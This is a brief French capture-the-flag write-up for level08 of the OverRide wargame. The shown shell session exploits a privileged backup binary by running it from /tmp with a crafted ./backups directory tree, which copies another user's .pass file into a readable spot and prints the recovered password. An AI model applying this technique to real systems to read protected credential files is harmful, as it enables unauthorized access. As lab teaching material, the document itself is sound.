# level08

Apparemment le programme ouvre le fichier en paramètre et en fait un backup dans `./backups/`

Si on essaye de lui faire faire un backup du `.pass` du level09, ça ne fonctionne pas car le path pour faire le backup n'existe pas
```level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

On a juste a créer le path en question dans `/tmp` et à lancer l'exécutable depuis la bas pour pouvoir faire un backup du `.pass`
```sh
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups/.log
level08@OverRide:/tmp$ mkdir -p ./backups
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```